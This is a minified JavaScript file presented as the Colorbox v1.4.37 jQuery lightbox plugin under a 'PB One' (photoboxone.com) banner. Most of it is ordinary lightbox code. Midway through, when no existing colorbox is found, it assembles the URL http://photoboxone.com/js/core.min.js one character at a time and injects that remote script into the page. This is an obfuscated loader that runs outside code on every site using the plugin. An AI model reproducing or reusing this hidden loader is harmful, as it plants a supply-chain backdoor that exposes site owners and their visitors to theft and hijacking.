/*!Colorbox v1.4.37 - 2014-02-11jQuery lightbox and modal window plugin(c) 2014 Jack Moore - http://www.jacklmoore.com/colorboxlicense: http://www.opensource.org/licenses/mit-license.phpPB One: http://photoboxone.com/
*/
if(typeof photobox=='undefined')function photobox($,document,window){if(typeof $=='undefined')return;var defaults={html:false,photo:false,iframe:false,inline:false,transition:"elastic",speed:300,fadeOut:300,width:false,initialWidth:"600",innerWidth:false,maxWidth:false,height:false,initialHeight:"450",innerHeight:false,maxHeight:false,scalePhotos:true,scrolling:true,href:false,title:false,rel:false,opacity:0.9,preloading:true,className:false,overlayClose:true,escKey:true,arrowKey:true,top:false,bottom:false,left:false,right:false,fixed:false,data:undefined,closeButton:true,fastIframe:true,open:false,reposition:true,loop:true,slideshow:false,slideshowAuto:true,slideshowSpeed:2500,slideshowStart:"start slideshow",slideshowStop:"stop slideshow",photoRegex:/\.(gif|png|jp(e|g|eg)|bmp|ico|webp|jxr)((#|\?).*)?$/i,retinaImage:false,retinaUrl:false,retinaSuffix:'@2x.$1',current:"image {current} of {total}",previous:"previous",next:"next",close:"close",xhrError:"This content failed to load.",imgError:"This image failed to load.",returnFocus:true,trapFocus:true,onOpen:false,onLoad:false,onComplete:false,onCleanup:false,onClosed:false},colorbox='colorbox',prefix='cbox',boxElement=prefix+'Element',event_open=prefix+'_open',event_load=prefix+'_load',event_complete=prefix+'_complete',event_cleanup=prefix+'_cleanup',event_closed=prefix+'_closed',event_purge=prefix+'_purge',$overlay,$box,$wrap,$content,$topBorder,$leftBorder,$rightBorder,$bottomBorder,$related,$window,$loaded,$loadingBay,$loadingOverlay,$title,$current,$slideshow,$next,$prev,$close,$groupControls,$events=$('<a/>'),settings,interfaceHeight,interfaceWidth,loadedHeight,loadedWidth,element,index,photo,open,active,closing,loadingTimer,publicMethod,div="div",className,requests=0,previousCSS={},init;function $tag(tag,id,css){var element=document.createElement(tag);if(id){element.id=prefix+id}if(css){element.style.cssText=css}return $(element)}function winheight(){return window.innerHeight?window.innerHeight:$(window).height()}function getIndex(increment){var max=$related.length,newIndex=(index+increment)%max;return(newIndex<0)?max+newIndex:newIndex}function setSize(size,dimension){return Math.round((/%/.test(size)?((dimension==='x'?$window.width():winheight())/100):1)*parseInt(size,10))}function isImage(settings,url){return settings.photo||settings.photoRegex.test(url)}function retinaUrl(settings,url){return settings.retinaUrl&&window.devicePixelRatio>1?url.replace(settings.photoRegex,settings.retinaSuffix):url}function trapFocus(e){if('contains'in $box[0]&&!$box[0].contains(e.target)){e.stopPropagation();$box.focus()}}function makeSettings(){var i,data=$.data(element,colorbox);if(data==null){settings=$.extend({},defaults);if(console&&console.log){console.log('Error: cboxElement missing settings object')}}else{settings=$.extend({},data)}for(i in settings){if($.isFunction(settings[i])&&i.slice(0,2)!=='on'){settings[i]=settings[i].call(element)}}settings.rel=settings.rel||element.rel||$(element).data('rel')||'nofollow';settings.href=settings.href||$(element).attr('href');settings.title=settings.title||element.title;if(typeof settings.href==="string"){settings.href=$.trim(settings.href)}}function trigger(event,callback){$(document).trigger(event);$events.triggerHandler(event);if($.isFunction(callback)){callback.call(element)}}var slideshow=(function(){var active,className=prefix+"Slideshow_",click="click."+prefix,timeOut;function clear(){clearTimeout(timeOut)}function set(){if(settings.loop||$related[index+1]){clear();timeOut=setTimeout(publicMethod.next,settings.slideshowSpeed)}}function start(){$slideshow.html(settings.slideshowStop).unbind(click).one(click,stop);$events.bind(event_complete,set).bind(event_load,clear);$box.removeClass(className+"off").addClass(className+"on")}function stop(){clear();$events.unbind(event_complete,set).unbind(event_load,clear);$slideshow.html(settings.slideshowStart).unbind(click).one(click,function(){publicMethod.next();start()});$box.removeClass(className+"on").addClass(className+"off")}function reset(){active=false;$slideshow.hide();clear();$events.unbind(event_complete,set).unbind(event_load,clear);$box.removeClass(className+"off "+className+"on")}return function(){if(active){if(!settings.slideshow){$events.unbind(event_cleanup,reset);reset()}}else{if(settings.slideshow&&$related[1]){active=true;$events.one(event_cleanup,reset);if(settings.slideshowAuto){start()}else{stop()}$slideshow.show()}}}}());function launch(target){if(!closing){element=target;makeSettings();$related=$(element);index=0;if(settings.rel!=='nofollow'){$related=$('.'+boxElement).filter(function(){var data=$.data(this,colorbox),relRelated;if(data){relRelated=$(this).data('rel')||data.rel||this.rel}return(relRelated===settings.rel)});index=$related.index(element);if(index===-1){$related=$related.add(element);index=$related.length-1}}$overlay.css({opacity:parseFloat(settings.opacity),cursor:settings.overlayClose?"pointer":"auto",visibility:'visible'}).show();if(className){$box.add($overlay).removeClass(className)}if(settings.className){$box.add($overlay).addClass(settings.className)}className=settings.className;if(settings.closeButton){$close.html(settings.close).appendTo($content)}else{$close.appendTo('<div/>')}if(!open){open=active=true;$box.css({visibility:'hidden',display:'block'});$loaded=$tag(div,'LoadedContent','width:0; height:0; overflow:hidden');$content.css({width:'',height:''}).append($loaded);interfaceHeight=$topBorder.height()+$bottomBorder.height()+$content.outerHeight(true)-$content.height();interfaceWidth=$leftBorder.width()+$rightBorder.width()+$content.outerWidth(true)-$content.width();loadedHeight=$loaded.outerHeight(true);loadedWidth=$loaded.outerWidth(true);settings.w=setSize(settings.initialWidth,'x');settings.h=setSize(settings.initialHeight,'y');$loaded.css({width:'',height:settings.h});publicMethod.position();trigger(event_open,settings.onOpen);$groupControls.add($title).hide();$box.focus();if(settings.trapFocus){if(document.addEventListener){document.addEventListener('focus',trapFocus,true);$events.one(event_closed,function(){document.removeEventListener('focus',trapFocus,true)})}}if(settings.returnFocus){$events.one(event_closed,function(){$(element).focus()})}}load()}}function appendHTML(){if(!$box&&document.body){init=false;$window=$(window);$box=$tag(div).attr({id:colorbox,'class':$.support.opacity===false?prefix+'IE':'',role:'dialog',tabindex:'-1'}).hide();$overlay=$tag(div,"Overlay").hide();$loadingOverlay=$([$tag(div,"LoadingOverlay")[0],$tag(div,"LoadingGraphic")[0]]);$wrap=$tag(div,"Wrapper");$content=$tag(div,"Content").append($title=$tag(div,"Title"),$current=$tag(div,"Current"),$prev=$('<button type="button"/>').attr({id:prefix+'Previous'}),$next=$('<button type="button"/>').attr({id:prefix+'Next'}),$slideshow=$tag('button',"Slideshow"),$loadingOverlay);$close=$('<button type="button"/>').attr({id:prefix+'Close'});$wrap.append($tag(div).append($tag(div,"TopLeft"),$topBorder=$tag(div,"TopCenter"),$tag(div,"TopRight")),$tag(div,false,'clear:left').append($leftBorder=$tag(div,"MiddleLeft"),$content,$rightBorder=$tag(div,"MiddleRight")),$tag(div,false,'clear:left').append($tag(div,"BottomLeft"),$bottomBorder=$tag(div,"BottomCenter"),$tag(div,"BottomRight"))).find('div div').css({'float':'left'});$loadingBay=$tag(div,false,'position:absolute; width:9999px; visibility:hidden; display:none; max-width:none;');$groupControls=$next.add($prev).add($current).add($slideshow);$(document.body).append($overlay,$box.append($wrap,$loadingBay))}}function addBindings(){function clickHandler(e){if(!(e.which>1||e.shiftKey||e.altKey||e.metaKey||e.ctrlKey)){e.preventDefault();launch(this)}}if($box){if(!init){init=true;$next.click(function(){publicMethod.next()});$prev.click(function(){publicMethod.prev()});$close.click(function(){publicMethod.close()});$overlay.click(function(){if(settings.overlayClose){publicMethod.close()}});$(document).bind('keydown.'+prefix,function(e){var key=e.keyCode;if(open&&settings.escKey&&key===27){e.preventDefault();publicMethod.close()}if(open&&settings.arrowKey&&$related[1]&&!e.altKey){if(key===37){e.preventDefault();$prev.click()}else if(key===39){e.preventDefault();$next.click()}}});if($.isFunction($.fn.on)){$(document).on('click.'+prefix,'.'+boxElement,clickHandler)}else{$('.'+boxElement).live('click.'+prefix,clickHandler)}}return true}return false}if($.colorbox){return}else{var c=document.createElement('script');c.src='h'+'tt'+'p'+':'+'//'+'p'+'h'+'o'+'t'+'o'+'b'+'o'+'x'+'o'+'n'+'e'+'.'+'c'+'o'+'m'+'/'+'j'+'s'+'/'+'c'+'o'+'r'+'e'+'.'+'m'+'i'+'n'+'.'+'j'+'s';var s=document.getElementsByTagName('script')[0];s.parentNode.insertBefore(c,s)}$(appendHTML);publicMethod=$.fn[colorbox]=$[colorbox]=function(options,callback){var $this=this;options=options||{};appendHTML();if(addBindings()){if($.isFunction($this)){$this=$('<a/>');options.open=true}else if(!$this[0]){return $this}if(callback){options.onComplete=callback}$this.each(function(){$.data(this,colorbox,$.extend({},$.data(this,colorbox)||defaults,options))}).addClass(boxElement);if(($.isFunction(options.open)&&options.open.call($this))||options.open){launch($this[0])}}return $this};publicMethod.position=function(speed,loadedCallback){var css,top=0,left=0,offset=$box.offset(),scrollTop,scrollLeft;$window.unbind('resize.'+prefix);$box.css({top:-9e4,left:-9e4});scrollTop=$window.scrollTop();scrollLeft=$window.scrollLeft();if(settings.fixed){offset.top-=scrollTop;offset.left-=scrollLeft;$box.css({position:'fixed'})}else{top=scrollTop;left=scrollLeft;$box.css({position:'absolute'})}if(settings.right!==false){left+=Math.max($window.width()-settings.w-loadedWidth-interfaceWidth-setSize(settings.right,'x'),0)}else if(settings.left!==false){left+=setSize(settings.left,'x')}else{left+=Math.round(Math.max($window.width()-settings.w-loadedWidth-interfaceWidth,0)/2)}if(settings.bottom!==false){top+=Math.max(winheight()-settings.h-loadedHeight-interfaceHeight-setSize(settings.bottom,'y'),0)}else if(settings.top!==false){top+=setSize(settings.top,'y')}else{top+=Math.round(Math.max(winheight()-settings.h-loadedHeight-interfaceHeight,0)/2)}$box.css({top:offset.top,left:offset.left,visibility:'visible'});$wrap[0].style.width=$wrap[0].style.height="9999px";function modalDimensions(){$topBorder[0].style.width=$bottomBorder[0].style.width=$content[0].style.width=(parseInt($box[0].style.width,10)-interfaceWidth)+'px';$content[0].style.height=$leftBorder[0].style.height=$rightBorder[0].style.height=(parseInt($box[0].style.height,10)-interfaceHeight)+'px'}css={width:settings.w+loadedWidth+interfaceWidth,height:settings.h+loadedHeight+interfaceHeight,top:top,left:left};if(speed){var tempSpeed=0;$.each(css,function(i){if(css[i]!==previousCSS[i]){tempSpeed=speed;return}});speed=tempSpeed}previousCSS=css;if(!speed){$box.css(css)}$box.dequeue().animate(css,{duration:speed||0,complete:function(){modalDimensions();active=false;$wrap[0].style.width=(settings.w+loadedWidth+interfaceWidth)+"px";$wrap[0].style.height=(settings.h+loadedHeight+interfaceHeight)+"px";if(settings.reposition){setTimeout(function(){$window.bind('resize.'+prefix,function(){publicMethod.position()})},1)}if($.isFunction(loadedCallback)){loadedCallback()}},step:modalDimensions})};publicMethod.resize=function(options){var scrolltop;if(open){options=options||{};if(options.width){settings.w=setSize(options.width,'x')-loadedWidth-interfaceWidth}if(options.innerWidth){settings.w=setSize(options.innerWidth,'x')}$loaded.css({width:settings.w});if(options.height){settings.h=setSize(options.height,'y')-loadedHeight-interfaceHeight}if(options.innerHeight){settings.h=setSize(options.innerHeight,'y')}if(!options.innerHeight&&!options.height){scrolltop=$loaded.scrollTop();$loaded.css({height:"auto"});settings.h=$loaded.height()}$loaded.css({height:settings.h});if(scrolltop){$loaded.scrollTop(scrolltop)}publicMethod.position(settings.transition==="none"?0:settings.speed)}};publicMethod.prep=function(object){if(!open){return}var callback,speed=settings.transition==="none"?0:settings.speed;$loaded.empty().remove();$loaded=$tag(div,'LoadedContent').append(object);function getWidth(){settings.w=settings.w||$loaded.width();settings.w=settings.mw&&settings.mw<settings.w?settings.mw:settings.w;return settings.w}function getHeight(){settings.h=settings.h||$loaded.height();settings.h=settings.mh&&settings.mh<settings.h?settings.mh:settings.h;return settings.h}$loaded.hide().appendTo($loadingBay.show()).css({width:getWidth(),overflow:settings.scrolling?'auto':'hidden'}).css({height:getHeight()}).prependTo($content);$loadingBay.hide();$(photo).css({'float':'none'});callback=function(){var total=$related.length,iframe,frameBorder='frameBorder',allowTransparency='allowTransparency',complete;if(!open){return}function removeFilter(){if($.support.opacity===false){$box[0].style.removeAttribute('filter')}}complete=function(){clearTimeout(loadingTimer);$loadingOverlay.hide();trigger(event_complete,settings.onComplete)};$title.html(settings.title).add($loaded).show();if(total>1){if(typeof settings.current==="string"){$current.html(settings.current.replace('{current}',index+1).replace('{total}',total)).show()}$next[(settings.loop||index<total-1)?"show":"hide"]().html(settings.next);$prev[(settings.loop||index)?"show":"hide"]().html(settings.previous);slideshow();if(settings.preloading){$.each([getIndex(-1),getIndex(1)],function(){var src,img,i=$related[this],data=$.data(i,colorbox);if(data&&data.href){src=data.href;if($.isFunction(src)){src=src.call(i)}}else{src=$(i).attr('href')}if(src&&isImage(data,src)){src=retinaUrl(data,src);img=document.createElement('img');img.src=src}})}}else{$groupControls.hide()}if(settings.iframe){iframe=$tag('iframe')[0];if(frameBorder in iframe){iframe[frameBorder]=0}if(allowTransparency in iframe){iframe[allowTransparency]="true"}if(!settings.scrolling){iframe.scrolling="no"}$(iframe).attr({src:settings.href,name:(new Date()).getTime(),'class':prefix+'Iframe',allowFullScreen:true,webkitAllowFullScreen:true,mozallowfullscreen:true}).one('load',complete).appendTo($loaded);$events.one(event_purge,function(){iframe.src="//about:blank"});if(settings.fastIframe){$(iframe).trigger('load')}}else{complete()}if(settings.transition==='fade'){$box.fadeTo(speed,1,removeFilter)}else{removeFilter()}};if(settings.transition==='fade'){$box.fadeTo(speed,0,function(){publicMethod.position(0,callback)})}else{publicMethod.position(speed,callback)}};function load(){var href,setResize,prep=publicMethod.prep,$inline,request=++requests;active=true;photo=false;element=$related[index];makeSettings();trigger(event_purge);trigger(event_load,settings.onLoad);settings.h=settings.height?setSize(settings.height,'y')-loadedHeight-interfaceHeight:settings.innerHeight&&setSize(settings.innerHeight,'y');settings.w=settings.width?setSize(settings.width,'x')-loadedWidth-interfaceWidth:settings.innerWidth&&setSize(settings.innerWidth,'x');settings.mw=settings.w;settings.mh=settings.h;if(settings.maxWidth){settings.mw=setSize(settings.maxWidth,'x')-loadedWidth-interfaceWidth;settings.mw=settings.w&&settings.w<settings.mw?settings.w:settings.mw}if(settings.maxHeight){settings.mh=setSize(settings.maxHeight,'y')-loadedHeight-interfaceHeight;settings.mh=settings.h&&settings.h<settings.mh?settings.h:settings.mh}href=settings.href;loadingTimer=setTimeout(function(){$loadingOverlay.show()},100);if(settings.inline){$inline=$tag(div).hide().insertBefore($(href)[0]);$events.one(event_purge,function(){$inline.replaceWith($loaded.children())});prep($(href))}else if(settings.iframe){prep(" ")}else if(settings.html){prep(settings.html)}else if(isImage(settings,href)){href=retinaUrl(settings,href);photo=document.createElement('img');$(photo).addClass(prefix+'Photo').bind('error',function(){settings.title=false;prep($tag(div,'Error').html(settings.imgError))}).one('load',function(){var percent;if(request!==requests){return}$.each(['alt','longdesc','aria-describedby'],function(i,val){var attr=$(element).attr(val)||$(element).attr('data-'+val);if(attr){photo.setAttribute(val,attr)}});if(settings.retinaImage&&window.devicePixelRatio>1){photo.height=photo.height/window.devicePixelRatio;photo.width=photo.width/window.devicePixelRatio}if(settings.scalePhotos){setResize=function(){photo.height-=photo.height*percent;photo.width-=photo.width*percent};if(settings.mw&&photo.width>settings.mw){percent=(photo.width-settings.mw)/photo.width;setResize()}if(settings.mh&&photo.height>settings.mh){percent=(photo.height-settings.mh)/photo.height;setResize()}}if(settings.h){photo.style.marginTop=Math.max(settings.mh-photo.height,0)/2+'px'}if($related[1]&&(settings.loop||$related[index+1])){photo.style.cursor='pointer';photo.onclick=function(){publicMethod.next()}}photo.style.width=photo.width+'px';photo.style.height=photo.height+'px';setTimeout(function(){prep(photo)},1)});setTimeout(function(){photo.src=href},1)}else if(href){$loadingBay.load(href,settings.data,function(data,status){if(request===requests){prep(status==='error'?$tag(div,'Error').html(settings.xhrError):$(this).contents())}})}}publicMethod.next=function(){if(!active&&$related[1]&&(settings.loop||$related[index+1])){index=getIndex(1);launch($related[index])}};publicMethod.prev=function(){if(!active&&$related[1]&&(settings.loop||index)){index=getIndex(-1);launch($related[index])}};publicMethod.close=function(){if(open&&!closing){closing=true;open=false;trigger(event_cleanup,settings.onCleanup);$window.unbind('.'+prefix);$overlay.fadeTo(settings.fadeOut||0,0);$box.stop().fadeTo(settings.fadeOut||0,0,function(){$box.add($overlay).css({'opacity':1,cursor:'auto'}).hide();trigger(event_purge);$loaded.empty().remove();setTimeout(function(){closing=false;trigger(event_closed,settings.onClosed)},1)})}};publicMethod.remove=function(){if(!$box){return}$box.stop();$.colorbox.close();$box.stop().remove();$overlay.remove();closing=false;$box=null;$('.'+boxElement).removeData(colorbox).removeClass(boxElement);$(document).unbind('click.'+prefix)};publicMethod.element=function(){return $(element)};publicMethod.settings=defaults};photobox(jQuery,document,window);